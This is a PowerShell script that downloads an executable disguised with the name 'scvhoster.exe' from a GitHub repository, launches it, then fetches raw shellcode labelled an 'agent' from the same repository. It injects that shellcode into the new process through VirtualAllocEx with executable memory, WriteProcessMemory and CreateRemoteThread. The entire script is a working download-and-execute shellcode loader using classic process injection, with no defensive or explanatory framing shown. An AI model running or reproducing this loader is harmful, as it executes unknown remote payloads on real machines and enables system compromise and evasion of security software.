# --- Step 1: Download & Launch Test App ---
$testAppUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/scvhoster.exe"
$tempPath   = "$env:TEMP\scvhoster.exe"

Write-Host "Downloading test app from $testAppUrl..."
try {
    Invoke-WebRequest -Uri $testAppUrl -OutFile $tempPath -ErrorAction Stop
} catch {
    Write-Host "Error: Failed to download test app." -ForegroundColor Red
    exit
}

Write-Host "Test app downloaded to $tempPath. Launching..."
try {
    $targetProcess = Start-Process -FilePath $tempPath -PassThru -ErrorAction Stop
} catch {
    Write-Host "Error: Failed to launch test app." -ForegroundColor Red
    exit
}

Start-Sleep -Seconds 3

if (-not $targetProcess) {
    Write-Host "Error: Test process not captured." -ForegroundColor Red
    exit
}

$targetPID = $targetProcess.Id
Write-Host "Using target process with PID: $targetPID"

# --- Step 2: Download Shellcode (Agent) ---
$agentUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/winner.bin"
Write-Host "Downloading shellcode from $agentUrl..."
try {
    $wc = New-Object System.Net.WebClient
    $shellcode = $wc.DownloadData($agentUrl)
    if ($shellcode.Length -eq 0) {
        Write-Host "Error: Shellcode downloaded is empty." -ForegroundColor Red
        exit
    }
} catch {
    Write-Host "Error: Failed to download shellcode." -ForegroundColor Red
    exit
}
Write-Host "Shellcode downloaded: $($shellcode.Length) bytes."

# --- Step 3: Define Win32 API Functions via Add-Type ---
$signature = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@
Add-Type $signature

# --- Step 4: Open Target Process & Allocate Memory ---
$PROCESS_ALL_ACCESS     = 0x1F0FFF
$MEM_COMMIT             = 0x1000
$MEM_RESERVE            = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40

$hProcess = [Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Host "Error: Failed to open target process." -ForegroundColor Red
    exit
}
Write-Host "Target process opened successfully."

$size = $shellcode.Length
$allocAddress = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $size, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE)
if ($allocAddress -eq [IntPtr]::Zero) {
    Write-Host "Error: Memory allocation in target process failed." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host ("Allocated {0} bytes at address {1}" -f $size, $allocAddress)

# --- Step 5: Write Shellcode into Allocated Memory ---
[int]$bytesWritten = 0
$result = [Win32]::WriteProcessMemory($hProcess, $allocAddress, $shellcode, $shellcode.Length, [ref]$bytesWritten)
if (-not $result -or $bytesWritten -ne $shellcode.Length) {
    Write-Host "Error: Failed to write shellcode to target process memory." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Shellcode written successfully."

# --- Step 6: Create Remote Thread to Execute Shellcode ---
$threadHandle = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $allocAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($threadHandle -eq [IntPtr]::Zero) {
    Write-Host "Error: Failed to create remote thread." -ForegroundColor Red
    [Win32]::CloseHandle($hProcess)
    exit
}
Write-Host "Remote thread created. Shellcode injected and executing!"

# --- Step 7: Clean Up ---
[Win32]::CloseHandle($hProcess)
